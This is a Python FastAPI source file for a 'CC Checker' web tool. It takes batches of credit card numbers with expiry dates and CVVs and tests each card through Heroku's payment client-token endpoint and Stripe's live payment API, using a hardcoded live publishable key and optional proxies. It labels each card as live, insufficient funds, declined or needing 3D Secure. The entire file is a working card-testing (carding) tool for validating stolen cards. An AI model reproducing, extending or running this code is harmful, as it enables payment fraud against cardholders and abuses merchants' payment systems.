import os
import sys
import uuid
import asyncio
import json
import httpx
from datetime import datetime
from fastapi import FastAPI, WebSocket, Request, Response
from fastapi.responses import HTMLResponse
from fastapi.middleware.cors import CORSMiddleware
from fastapi.templating import Jinja2Templates

# Auto-install required modules
required_modules = ['fastapi', 'httpx', 'uvicorn', 'jinja2']
for module in required_modules:
    try:
        __import__(module.replace('-', '_'))
    except ImportError:
        os.system(f"{sys.executable} -m pip install {module}")

app = FastAPI()
templates = Jinja2Templates(directory=".")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Countries list
COUNTRIES = [
    "United States", "United Kingdom", "Canada", "Australia", "Germany",
    "France", "Italy", "Spain", "Japan", "China", "India", "Brazil",
    # Add more countries as needed
]

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>CC Checker</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Arial', sans-serif;
        }

        body {
            background: #f0f2f5;
            padding: 20px;
        }

        .container {
            max-width: 800px;
            margin: 0 auto;
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }

        h1 {
            text-align: center;
            color: #1a73e8;
            margin-bottom: 20px;
        }

        .input-group {
            margin-bottom: 15px;
        }

        label {
            display: block;
            margin-bottom: 5px;
            color: #333;
        }

        input, textarea, select {
            width: 100%;
            padding: 8px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 14px;
        }

        textarea {
            min-height: 100px;
            resize: vertical;
        }

        button {
            background: #1a73e8;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
            font-size: 16px;
        }

        button:hover {
            background: #1557b0;
        }

        .results {
            margin-top: 20px;
        }

        .result-card {
            padding: 10px;
            margin-bottom: 10px;
            border-radius: 4px;
            border-left: 4px solid #1a73e8;
            background: #f8f9fa;
        }

        .settings-form {
            display: none;
            margin-top: 20px;
            padding: 15px;
            background: #f8f9fa;
            border-radius: 4px;
        }

        .loader {
            display: none;
            text-align: center;
            margin: 20px 0;
        }

        .loader::after {
            content: '';
            display: inline-block;
            width: 30px;
            height: 30px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #1a73e8;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>CC Checker</h1>
        <div class="input-group">
            <button onclick="toggleSettings()">Settings</button>
        </div>
        
        <div class="settings-form" id="settingsForm">
            <div class="input-group">
                <label>API Key (Required)</label>
                <input type="text" id="api_key" placeholder="Enter API key">
            </div>
            <div class="input-group">
                <label>Proxy (Optional)</label>
                <input type="text" id="proxy" placeholder="host:port:user:pass">
            </div>
            <div class="input-group">
                <label>Country</label>
                <select id="country">
                    <option value="">Select Country</option>
                    {% for country in countries %}
                    <option value="{{ country }}">{{ country }}</option>
                    {% endfor %}
                </select>
            </div>
            <div class="input-group">
                <label>Address</label>
                <input type="text" id="address" placeholder="Enter address">
            </div>
            <div class="input-group">
                <label>State</label>
                <input type="text" id="state" placeholder="Enter state">
            </div>
            <div class="input-group">
                <label>Postal Code</label>
                <input type="text" id="postal_code" placeholder="Enter postal code">
            </div>
            <button onclick="saveSettings(event)">Save Settings</button>
        </div>

        <div class="input-group">
            <label>Credit Cards (Format: XXXX|MM|YY|CVV)</label>
            <textarea id="ccs" placeholder="Enter cards (one per line)"></textarea>
        </div>
        
        <button onclick="submitForm()">Start Checking</button>
        
        <div class="loader" id="loader"></div>
        <div class="results" id="results"></div>
    </div>

    <script>
        let settings = {};

        function loadSettings() {
            const savedSettings = sessionStorage.getItem('settings');
            if (savedSettings) {
                settings = JSON.parse(savedSettings);
                for (const [key, value] of Object.entries(settings)) {
                    const element = document.getElementById(key);
                    if (element) element.value = value;
                }
            }
        }

        function toggleSettings() {
            const form = document.getElementById('settingsForm');
            form.style.display = form.style.display === 'none' ? 'block' : 'none';
            loadSettings();
        }

        function saveSettings(event) {
            event.preventDefault();
            settings = {
                api_key: document.getElementById('api_key').value.trim(),
                proxy: document.getElementById('proxy').value.trim(),
                country: document.getElementById('country').value,
                address: document.getElementById('address').value.trim(),
                state: document.getElementById('state').value.trim(),
                postal_code: document.getElementById('postal_code').value.trim()
            };

            if (!settings.api_key) {
                alert('API key is required!');
                return;
            }

            sessionStorage.setItem('settings', JSON.stringify(settings));
            alert('Settings saved successfully!');
            toggleSettings();
        }

        function showLoader() {
            document.getElementById('loader').style.display = 'block';
        }

        function hideLoader() {
            document.getElementById('loader').style.display = 'none';
        }

        function addResult(cc, result) {
            const resultsDiv = document.getElementById('results');
            const resultHtml = `
                <div class="result-card">
                    <strong>CC:</strong> ${cc}<br>
                    <strong>Status:</strong> ${result.status}<br>
                    <strong>Message:</strong> ${result.message}<br>
                    <strong>Time:</strong> ${result.timestamp}
                </div>
            `;
            resultsDiv.insertAdjacentHTML('afterbegin', resultHtml);
        }

        async function submitForm() {
            const savedSettings = sessionStorage.getItem('settings');
            if (!savedSettings) {
                alert('Please configure settings with API key first!');
                toggleSettings();
                return;
            }

            const settings = JSON.parse(savedSettings);
            if (!settings.api_key) {
                alert('API key is required! Please configure settings.');
                toggleSettings();
                return;
            }

            const ccs = document.getElementById('ccs').value.trim().split('\\n').filter(cc => cc.trim());
            if (ccs.length === 0 || ccs.length > 50) {
                alert('Please enter between 1 and 50 credit cards.');
                return;
            }

            showLoader();
            document.getElementById('results').innerHTML = '';

            for (const cc of ccs) {
                try {
                    const response = await fetch('/check_cc', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ cc, settings })
                    });
                    const result = await response.json();
                    addResult(cc, result);
                } catch (error) {
                    addResult(cc, {
                        status: 'error',
                        message: 'Request failed',
                        timestamp: new Date().toLocaleTimeString()
                    });
                }
            }
            hideLoader();
        }

        // Load settings on page load
        document.addEventListener('DOMContentLoaded', loadSettings);
    </script>
</body>
</html>
'''

async def parseX(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]
    except ValueError:
        return "None"

async def make_request(url, method="POST", params=None, headers=None, data=None, json_data=None, proxy=None):
    proxies = None
    if proxy:
        proxy_parts = proxy.split(':')
        if len(proxy_parts) == 4:
            host, port, user, password = proxy_parts
            proxies = {
                "http://": f"http://{user}:{password}@{host}:{port}",
                "https://": f"http://{user}:{password}@{host}:{port}",
            }

    async with httpx.AsyncClient(proxies=proxies) as client:
        try:
            response = await client.request(method, url, params=params, headers=headers, data=data, json=json_data)
            return response.text
        except httpx.RequestError as e:
            print(f"Request error: {e}")
            return None

async def heroku(cc, api_key, proxy=None, address=None, line1=None, postal_code=None, state=None, country=None):
    try:
        cc_data = cc.split("|")
        if len(cc_data) != 4:
            return {"status": "error", "message": "Invalid CC format"}
            
        cc, mon, year, cvv = cc_data
        guid = str(uuid.uuid4())
        muid = str(uuid.uuid4())
        sid = str(uuid.uuid4())

        headers = {
            "accept": "application/vnd.heroku+json; version=3",
            "accept-language": "en-US,en;q=0.9",
            "authorization": f"Bearer {api_key}",
            "origin": "https://dashboard.heroku.com",
            "user-agent": "Mozilla/5.0",
        }

        url = "https://api.heroku.com/account/payment-method/client-token"
        req = await make_request(url, headers=headers, proxy=proxy)
        
        if not req:
            return {"status": "error", "message": "Failed to get client token"}
            
        client_secret = await parseX(req, '"token":"', '"')

        headers2 = {
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
        }

        data = {
            "type": "card",
            "billing_details[name]": "John Doe",
            "billing_details[address][city]": address or "City",
            "billing_details[address][country]": country or "US",
            "billing_details[address][line1]": line1 or "Street",
            "billing_details[address][postal_code]": postal_code or "12345",
            "billing_details[address][state]": state or "State",
            "card[number]": cc,
            "card[cvc]": cvv,
            "card[exp_month]": mon,
            "card[exp_year]": year,
            "guid": guid,
            "muid": muid,
            "sid": sid,
            "key": "pk_live_51KlgQ9Lzb5a9EJ3IaC3yPd1x6i9e6YW9O8d5PzmgPw9IDHixpwQcoNWcklSLhqeHri28drHwRSNlf6g22ZdSBBff002VQu6YLn",
        }

        req2 = await make_request("https://api.stripe.com/v1/payment_methods", headers=headers2, data=data, proxy=proxy)
        if not req2 or "pm_" not in req2:
            return {"status": "error", "message": "Invalid card number"}

        json_sec = json.loads(req2)
        pmid = json_sec["id"]
        piid = client_secret.split("_secret_")[0]

        headers3 = {
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
        }
        
        data3 = {
            "payment_method": pmid,
            "expected_payment_method_type": "card",
            "use_stripe_sdk": "true",
            "key": "pk_live_51KlgQ9Lzb5a9EJ3IaC3yPd1x6i9e6YW9O8d5PzmgPw9IDHixpwQcoNWcklSLhqeHri28drHwRSNlf6g22ZdSBBff002VQu6YLn",
            "client_secret": client_secret,
        }

        req3 = await make_request(f"https://api.stripe.com/v1/payment_intents/{piid}/confirm", headers=headers3, data=data3, proxy=proxy)
        if not req3:
            return {"status": "error", "message": "Failed to confirm payment"}

        ljson = json.loads(req3)
        if '"status": "succeeded"' in req3:
            return {"status": "success", "message": "Payment successful"}
        elif "insufficient_funds" in req3:
            return {"status": "success", "message": "Card Live - Insufficient Funds"}
        elif "decline_code" in req3:
            return {"status": "declined", "message": "Card declined"}
        elif "requires_action" in req3:
            return {"status": "3d_secure", "message": "3D Secure Required"}
        elif "error" in req3:
            return {"status": "error", "message": ljson["error"]["message"]}
        else:
            return {"status": "unknown", "message": "Unknown Response"}

    except Exception as e:
        return {"status": "error", "message": str(e)}

@app.get("/", response_class=HTMLResponse)
async def index(request: Request):
    return HTMLResponse(content=HTML_TEMPLATE.replace("{% for country in countries %}", 
                                                    "".join(f'<option value="{c}">{c}</option>' for c in COUNTRIES)))

@app.post("/check_cc")
async def check_cc(request: Request):
    try:
        data = await request.json()
        cc = data.get('cc')
        settings = data.get('settings', {})
        
        if not settings.get('api_key'):
            return {
                "status": "error",
                "message": "API key is required",
                "timestamp": datetime.now().strftime('%H:%M:%S')
            }

        result = await heroku(
            cc,
            settings.get('api_key'),
            settings.get('proxy'),
            settings.get('address'),
            settings.get('line1'),
            settings.get('postal_code'),
            settings.get('state'),
            settings.get('country')
        )
        result['timestamp'] = datetime.now().strftime('%H:%M:%S')
        return result
    except Exception as e:
        return {
            "status": "error",
            "message": str(e),
            "timestamp": datetime.now().strftime('%H:%M:%S')
        }

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    try:
        while True:
            data = await websocket.receive_json()
            await websocket.send_json({
                "status": "received",
                "timestamp": datetime.now().strftime('%H:%M:%S')
            })
    except Exception as e:
        print(f"WebSocket error: {e}")
    finally:
        await websocket.close()

def create_app():
    return app

if __name__ == "__main__":
    import uvicorn
    uvicorn.run("main:app", host="0.0.0.0", port=8000, reload=True)
